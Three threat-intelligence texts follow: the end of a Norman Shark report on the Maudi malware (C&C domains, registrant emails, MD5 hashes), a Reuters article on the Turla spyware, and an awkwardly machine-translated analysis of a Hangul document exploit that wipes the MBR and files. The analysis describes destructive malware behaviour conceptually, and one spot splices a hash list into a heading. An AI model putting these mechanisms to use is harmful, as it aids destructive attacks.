signed using a different digital certificate.o jeno_1980@hotmail.com – domain registration
Two samples connect to ns2.adultstick.com.This domain was registered by jeno_1980@hotmail.com, an email address
also used to register domains used both in the Mirage <fn>5</fn> and Sin Digoo <fn>6</fn> malware campaigns.7d36ad6aafbf1f9496ccc6ac1a8bb57e, Irqdz
64718689ee3ff695c55ea1ec213434d1, Irqdz



    o enbtcd@yahoo.com.co – domain registration
Some Maudi samples connect to windows-liveupdate.com or windowsliveupdatecache.com, domains registered by the
entity enbtcd@yahoo.com.co.This address has also registered domains used in Briba (aka c0d0so0) malware, which has
been used for many targeted attacks.Mol-government.com and these other domains
have been used as C&C by Sogu/Thoper trojans in attacks on apparent Korean and Mongolian targets, as well as by other
malwares like PcClient.o yt.bodologetee.com – domain
This domain has been used as Command & Control domain for a number of samples.It has also been documented used
by PlugX malware in campaigns apparently against Mongolian targets <fn>3</fn>.The same registration information was used to
register yahoomesseges.com, which has been used by EvilGrab <fn>7</fn> malware.0cf15b88b18cdedfaae598e9498768e3,                 beijingnew
1e60824de00ce3c1f62fddc54a9c5c93,                 jiagu
c64dd5393a17226b208b049a4b766bd6,                 jiagu
646cfe960219f1948eac580e3bd836f8,                 text1
ef404a76bd11e1d675b7686775ed7f1c,                 nsc01



    o YNK JAPAN Inc – digital certificate
As previously mentioned, two samples were digitally signed using a certificate belonging to YNK JAPAN Inc.; a subsidiary
of a Korean game producer.This certificate has been used in several hundred samples spanning various campaigns and
incidents.One of these was the SK intrusion <fn>8</fn> in 2011, where one of the initial malwares - a Sogu/Thoper trojan - was
signed with it.771a376df6aba0ce31e0c8e43cdf0800, xfish
c3d14ee0bd01ebc9e5844578babe462f, xfish




<footer>11 | T h e C h i n e s e M a l w a r e C o m p l e x e s : M a u d i                                    Norman Shark</footer>
</section>
<section>

<heading>Conclusion</heading>
The Maudi malware family seems to have been mostly used against Chinese/South-East Asian targets.However, it shares
some indicators (C&C domains, registration information) with other, more high-profile attacks.What these connections mean is unclear.It might be just sharing of information between groups; we know that there is
quite a bit of sharing going on, particularly of malware and source code.Less is known about how much is shared in terms
of infrastructure (ex.domains).It is our opinion, however, that the Maudi system hints at something else.There is for example a large amount of
samples that use the same self-signed certificates in addition to overlaps in other indicators.Self-signed certificates have
little value in the underground as they can be freely made; so there is little reason for sharing these.Instead the
impression is that these malwares have been signed by the same malware creation system.Another aspect is the architecture where default PoisonIvy shellcode blobs are overridden with configuration information
from the dropper.This also may indicate homegrown build tools, possibly to alleviate language issues with the PoisonIvy
builder itself.There is a possibility that this indicates a large group of attackers, but might also be a part of a Digital Quartermaster
function, as recently postulated by FireEye <fn>9</fn>.<footer>12 | T h e C h i n e s e M a l w a r e C o m p l e x e s : M a u d i                                         Norman Shark</footer>
</section>
<section>
<heading>References</heading>
<footnote>
1.Windows Incident Response.It's those darned DLLs again... .[Online] http://windowsir.blogspot.no/2010/08/its-
those-darned-dlls-again.html.2.Villeneuve, Nart.Human Rights and Malware Attacks.[Online] http://www.nartv.org/2010/07/29/human-rights-and-
malware-attacks/.3.Fagerland, Snorre.PlugX used against Mongolian targets.Norman Shark Blog.[Online]
http://normanshark.com/blog/plugx-used-mongolian-targets/.4.Branco, Rodrigo.Into the Darkness: Dissecting Targeted Attacks.[Online]
https://community.qualys.com/blogs/securitylabs/2011/11/30/dissecting-targeted-attacks.5.Cutler, Silas.The Mirage Campaign.[Online] http://www.secureworks.com/cyber-threat-intelligence/threats/the-
mirage-campaign/.6.Stewart, Joe.The Sin Digoo Affair.[Online] http://www.secureworks.com/cyber-threat-intelligence/threats/sindigoo/.7.Trend Micro, Inc. 2Q Report on Targeted Attack Campaigns.[Online] http://about-threats.trendmicro.com/ent-
primers/#2q-report-on-targeted-attack-campaigns.8.Command Five Pty Ltd. Command and Control in the Fifth Domain.www.commandfive.com.[Online]
http://www.commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf.9.Moran, Ned and Bennett, James T. Supply Chain Analysis: From Quartermaster to Sunshop.[Online]
http://www.fireeye.com/resources/pdfs/fireeye-malware-supply-chain.pdf.<doc>
<section>
<header>
»  Print

This  copy  is  for  your  personal,  non-­commercial  use  only.To  order  presentation-­ready  copies  for  distribution  to  colleagues,
clients  or  customers,  use  the  Reprints  tool  at  the  top  of  any  article  or  visit:  www.reutersreprints.com.</header>
<heading>
Suspected  Russian  spyware  Turla  targets  Europe,
United  States</heading>
2:45pm  EST

By  Peter  Apps  and  Jim  Finkle
<figure></figure>
LONDON/BOSTON  (Reuters)  -­  A  sophisticated  piece  of  spyware  has  been
quietly  infecting  hundreds  of  government  computers  across  Europe  and
the  United  States  in  one  of  the  most  complex  cyber  espionage  programs
uncovered  to  date.Several  security  researchers  and  Western  intelligence  officers  say  they
believe  the  malware,  widely  known  as  Turla,  is  the  work  of  the  Russian
government  and  linked  to  the  same  software  used  to  launch  a  massive
breach  on  the  U.S.  military  uncovered  in  2008.It  was  also  linked  to  a  previously  known,  massive  global  cyber  spying
operation  dubbed  Red  October  targeting  diplomatic,  military  and  nuclear
research  networks.Those  assessments  were  based  on  analysis  of  tactics  employed  by  hackers,  along  with  technical  indicators  and  the  victims
they  targeted."It  is  sophisticated  malware  that's  linked  to  other  Russian  exploits,  uses  encryption  and  targets  western  governments.It  has
Russian  paw  prints  all  over  it,"  said  Jim  Lewis,  a  former  U.S.  foreign  service  officer,  now  senior  fellow  at  the  Center  for
Strategic  and  International  Studies  in  Washington.However,  security  experts  caution  that  while  the  case  for  saying  Turla  looks  Russian  may  be  strong,  it  is  impossible  to  confirm
those  suspicions  unless  Moscow  claims  responsibility.Developers  often  use  techniques  to  cloud  their  identity.The  threat  surfaced  this  week  after  a  little  known  German  anti-­virus  firm,  G  Data,  published  a  report  on  the  virus,  which  it
called  Uroburos,  the  name  text  in  the  code  that  may  be  a  reference  to  the  Greek  symbol  of  a  serpent  eating  its  own  tail.Experts  in  state-­sponsored  cyber  attacks  say  that  Russian  government-­backed  hackers  are  known  for  being  highly
disciplined,  adept  at  hiding  their  tracks,  extremely  effective  at  maintaining  control  of  infected  networks  and  more  selective  in
choosing  targets  than  their  Chinese  counterparts."They  know  that  most  people  don't  have  either  the  technical  knowledge  or  the  fortitude  to  win  a  battle  with  them.When  they
recognize  that  someone  is  onto  them,  they  just  go  dormant,"  said  one  expert  who  helps  victims  of  state-­sponsored  hacking.A  former  Western  intelligence  official  commented:  "They  can  draw  on  some  very  high  grade  programmers  and  engineers,
including  the  many  who  work  for  organized  criminal  groups,  but  also  function  as  privateers."Russia's  Federal  Security  Bureau  declined  comment  as  did  Pentagon  and  U.S.  Department  of  Homeland  Security  officials.On  Friday,  Britain's  BAE  Systems  Applied  Intelligence  -­  the  cyber  arm  of  Britain's  premier  defense  contractor  -­  published  its
own  research  on  the  spyware,  which  it  called  "snake."The  sheer  sophistication  of  the  software,  it  said,  went  well  beyond  that  previously  encountered  -­  although  it  did  not  attribute
blame  for  the  attack."The  threat...  really  does  raise  the  bar  in  terms  of  what  potential  targets,  and  the  security  community  in  general,  have  to  do  to
keep  ahead  of  cyber  attacks,"  said  Martin  Sutherland,  managing  director  of  BAE  Systems  Applied  Intelligence.NATO  NATIONS  TARGETED
Security  firms  have  been  monitoring  Turla  for  several  years.Symantec  Corp  estimates  up  to  1,000  networks  have  been  infected  by  Turla  and  a  related  virus,  Agent.BTZ.It  named  no
victims,  saying  only  that  most  were  government  computers.BAE  said  it  has  collected  over  100  unique  samples  of  Turla  since  2010,  including  32  from  Ukraine,  11  from  Lithuania  and  4
from  Great  Britain.It  obtained  smaller  numbers  from  other  countries.Hackers  use  Turla  to  establish  a  hidden  foothold  in  infected  networks  from  which  they  can  search  other  computers,  store
stolen  information,  then  transmit  data  back  to  their  servers."While  it  seems  to  be  Russian,  there  is  no  way  to  know  for  sure,"  said  Mikko  Hypponen,  chief  research  officer  with  Helsinki-­
based  F-­Secure,  which  encountered  Turla  last  year.Security  firms  that  are  monitoring  the  threat  have  said  the  operation's  sophistication  suggests  it  was  likely  backed  by  a  nation
state  and  that  technical  indicators  make  them  believe  it  is  the  work  of  Russian  developers.European  governments  have  long  welcomed  U.S.  help  against  Kremlin  spying,  but  were  infuriated  last  year  to  discover  the
scale  of  surveillance  by  America's  National  Security  Agency  that  stretched  also  to  their  own  territory.AGENT.BTZ,  RED  OCTOBER
Security  experts  say  stealthy  Turla  belongs  to  the  same  family  as  one  of  the  most  notorious  pieces  of  spyware  uncovered  to
date:  Agent.BTZ.It  was  used  in  a  massive  cyber  espionage  operation  on  U.S.  Central  Command  that  surfaced  in  2008  and  is
one  of  the  most  serious  U.S.  breaches  to  date.While  Washington  never  formally  attributed  blame,  several  U.S.  officials  have
told  Reuters  they  believed  it  was  the  work  of  Russia.Hypponen  said  Agent.BTZ  was  initially  found  in  a  military  network  of  a  European  NATO  state  in  2008,  but  gave  no  details.F-­
Secure  is  credited  with  naming  that  piece  of  malware  in  2008,  though  researchers  believe  it  was  created  already  in  2006.Kaspersky  Lab  researcher  Kurt  Baumgartner  said  he  believes  Turla  and  Agent.BTZ  are  related  to  Red  October,  which
suddenly  shut  down  after  his  firm  reported  on  it  in  January  2013."Unusually  unique  artifacts  link  Red  October,  Agent.BTZ  and  Turla,"  he  said,  referring  to  strings  of  text  contained  in  the  code
and  functionality  of  the  malware.Eric  Chien,  technical  director  with  Symantec  Security  Response,  described  Turla  as  "the  evolution"  of  Agent.BTZ."They  are  a
very  active  development  group,"  Chien  said.Finland  said  its  Foreign  Ministry  computer  systems  had  been  penetrated  by  an  attack  last  year  but  would  not  elaborate.Sweden's  National  Defence  Radio  Establishment  said  cyber  espionage  was  "more  common  than  people  think",  adding  that  it
had  discovered  multiple  attacks  against  authorities,  governments  and  universities,  some  only  detected  after  several  years.Government  sources  in  the  Czech  Republic,  Estonia,  Poland  and  Romania  said  Turla  had  not  affected  them  directly.Other
European  governments  contacted  by  Reuters  declined  comment.CHASING  TURLA
Although  computer  security  researchers  have  been  quietly  studying  Turla  for  more  than  two  years,  public  discussions  of  the
threat  only  began  after  G  Data  published  its  report.G  Data  spokesman  Eddy  Willems  declined  to  name  any  victims  or  identify  the  author  of  the  report,  saying  the  firm  was
concerned  the  group  behind  Turla  might  attempt  to  harm  him.Jaime  Blasco,  director  of  AlienVault  Labs,  said  that  Turla  was  more  of  a  "framework"  for  espionage  than  simply  malware.The  malware  is  a  "root  kit"  that  hides  the  presence  of  the  spying  operation  and  also  creates  a  hidden,  encrypted  file  system  to
store  stolen  data  and  tools  used  by  the  attackers,  he  said.Those  tools  include  password  stealers,  tiny  programs  for  gathering
information  about  the  system  and  document  stealers.The  operators  can  download  specialized  tools  onto  an  infected  system,  adding  any  functionality  they  want  by  including  it  in
the  encrypted  file  system,  Blasco  said.They  have  used  dozens  of  different  "command  and  control"  servers  located  in  countries  around  the  world  to  control  infected
systems,  according  to  Symantec,  whose  researchers  have  helped  identify  and  shut  down  some  of  those  systems.Researchers  say  Turla's  code  is  regularly  updated,  including  changes  to  avoid  detection  as  anti-­virus  companies  detect  new
strains.BAE  said  it  had  two  samples  created  in  January  2014.Chien  said  that  in  some  cases  when  a  command  and  control  server  was  taken  offline,  Turla's  operators  have  quickly  pushed
out  new  versions  of  the  malware  that  directed  infected  computers  to  new  command  and  control  servers."They  have  a  super  active  development  team,"  he  said.(Additional  reporting  by  Jan  Strouhal  in  Prague,  Marcin  Goeetig  in  Warsaw,  Guy  Faulconbridge  in  London,  Zoran
Radosavljevic  in  Zagreb,  Gwladys  Fouche  in  Oslo,  Matthias  Williams  in  Bucharest,  Gabriela  Baczynska  in  Moscow,
Alexandra  Hudson  in  Berlin,  Johan  Sennero  in  Stockholm,  Phil  Stewart  in  Washington;;  Editing  by  Richard  Valdmanis  and
Ralph  Boulton)

</section>
<footer>
©  Thomson  Reuters  2014.All  rights  reserved.Users  may  download  and  print  extracts  of  content  from  this  website  for  their
own  personal  and  non-­commercial  use  only.Republication  or  redistribution  of  Thomson  Reuters  content,  including  by
framing  or  similar  means,  is  expressly  prohibited  without  the  prior  written  consent  of  Thomson  Reuters.Thomson  Reuters
and  its  logo  are  registered  trademarks  or  trademarks  of  the  Thomson  Reuters  group  of  companies  around  the  world.Thomson  Reuters  journalists  are  subject  to  an  Editorial  Handbook  which  requires  fair  presentation  and  disclosure  of  relevant
interests.This  copy  is  for  your  personal,  non-­commercial  use  only.To  order  presentation-­ready  copies  for  distribution  to  colleagues,
clients  or  customers,  use  the  Reprints  tool  at  the  top  of  any  article  or  visit:  www.reutersreprints.com.</footer>
</doc><doc>
<header>Vulnerability, malicious code appeared in the MBR destruction
function using Hangul file</header>
<noncontent>Malware Information 2014/12/10 18:12</noncontent>
<section>
Vulnerabilities recently received a file with the destruction and MBR destruction capabilities for major
extension to the existing file in addition to the backdoor functionality that existed in Hangul document file is
received attention is required.December 9, 2014 received the first vulnerability Hangul document files were used for both groups known
vulnerabilities, patching does not work on the latest products.Total of 9 document file has been received, and
all of the same malicious file therein.</section>
<section>
<heading>1.The files and services that generate</heading>

% System% registered the generated DLL as a service to the folder / drive upon, information that is used has
a list on the inside of malicious code, and select one of the items below at random.- Provides network address Translation, Addressing, name resolution and / or Intrusion Prevention Services
for a home or Small Office network.- Allows Media Center to Locate and Connect to the Computer.- This service Delivers network Notifications (E.
- Enables Multi-party using Peer-to-Peer Communication Connecting.- This service publishes a machine name using the Peer Name Resolution Protocol.- MANAGES power policy and power policy Delivery Notification.- This service Provides Support for the Program Compatibility Assistant (PCA).- Enables remote users to modify Registry configurations on this Computer.- Access to Smart Cards MANAGES read by this Computer.- Enables Tablet PC Ink PEN and functionality
- Enables a user to Configure and Schedule Automated tasks on this Computer.- Provides Execution ordered for a Group of threads within a specific period of time.- Enables Windows-based Programs to create, Access, and modify Internet- Files based.- The service hosts third-party WcasPlugInService Windows Color System color and gamut map Device
Model Model Plug-in modules.- Enables Installation, modification, and Removal of Windows updates and Optional Components.- Maintains date and time Synchronization on all clients and Servers in the network.- The Wired AutoConfig (dot3svc) service is responsible for Performing IEEE 802.1X
- The WLANSVC service Logic Provides the Required to Configure, Discover, Connect to, and disconnect
from a Wireless local Area network.- Creates and maintains client network connections to remote server using the SMB protocol

</section>
<section>
<heading>2.MBR destruction time</heading>
MBR destruction is done through a 'number' value of the registry key value of the items checked below ("0"
if the destructive behavior than the largest value) is set to '0' value at the time of initial infection.The
following [Figure 1] shows the contents of the registry key 'PcaSvcc' items registered by the malware.MBR
destruction operations to determine the value of number entry through the time information of the user's
system after December 10, 2014 11:00 a.m. when a, is set to non-zero value is, the MBR is destroyed
feature to work .<figure></figure>


                   <caption>Figure -1] MBR destruction upon reference to the registry value</caption>

In [Figure 2] shows a code section that compares the time information for determining a destruction inside
MBR infection.Malicious code stored in the internal "0x780D0C33" value and the operation to compare the
time information through a specific operation of the system time obtained by the GetLocalTime function call
can be seen that true.<figure></figure>
<caption>Figure -2] MBR destruction timecode to compare</caption>

</section>
<section>
<heading>3.MBR destruction techniques</heading>
MBR destruction is overwritten for the 0x200 (512 bytes), it can be seen the data filled in as shown in [Figure
3] below.Infection, 'A' ~ 'Z', the same process is repeated for all the drives.<figure></figure>

                                            <caption>Figure -3] MBR data</caption>

The following [Figure 4] is overwritten with the contents of the MBR code, and has the ability to output the
string during boot "Who Am I?".<figure></figure>

                                            <caption>Figure -4] MBR code</caption>

The following [Figure 5] After MBR infection, a screen visible to the user reboots.<figure></figure>
                                           <caption>[Figure 5] boot screen</caption>


</section>
<section>
<heading>4.File destructive features</heading>

Malicious code can destroy the functionality of a file having a particular extension in addition to destruction
together also has functions for the MBR.Destroy the target file identified to date are:
<list>
- HWP
- doc
- PDF
- docx
- ALZ
- ZIP
- RAR
- egg
- iso
- EXE
- dll
- sys
</list>
Locate the files with the extension of the above 'A' ~ 'Z' drive changes and performs a process to fill a NULL
value to 4096 bytes (4K) size.</section>
<section>
<heading>5.Hangul vulnerability information</heading>

Received nine vulnerabilities Hangul document and the contents hereof are both used the same vulnerability
varies.In [Figure 6] shows the portion of the shell part and the operation code for generating a vulnerability.The layout of paragraphs in Hangul document and vulnerability occurs in the course of processing the part
that is responsible ('HWPTAG_PARA_LINE_SEG') and, shellcode (ShellCode) and heap spray insert a
paragraph of text for (Heap Spray) ('HWPTAG_PARA_TEXT') is used was.<figure></figure>
<figure></figure>
                                <caption>[Figure 6] vulnerability occurs Hangul part</caption>
</section>


<section>
<heading>6.Related Files</heading>

MD5 and V3 diagnostic information on malicious files identified vulnerability Hangul file and generated by
the current is as follows.- 54783422cfd7029a26a3f3f5e9087d8a                (V3:   HWP / Exploit, 2014.12.10.06)
- b5b6e93ab27cec75f07af2a3a6a40926                (V3:   HWP / Exploit, 2014.12.10.02)
- 800866bbab514657969996210bcf727b                (V3:   HWP / Exploit, 2014.12.10.02)
- ead682b889218979b1f2f1527227af9b                (V3:   HWP / Exploit, 2014.12.Countermeasures</heading>

In order to prevent a malware infection is necessary to always maintain a
Hangul program, and program-to-date antivirus update state.In addition,
the vulnerability has been identified as Hangul document files are
disseminated in the form of a person to e-mail attachments.For
unascertained sender or unresolved attachment, the procedure to ensure
that there is no problem in security is required before execution.</section>

</doc>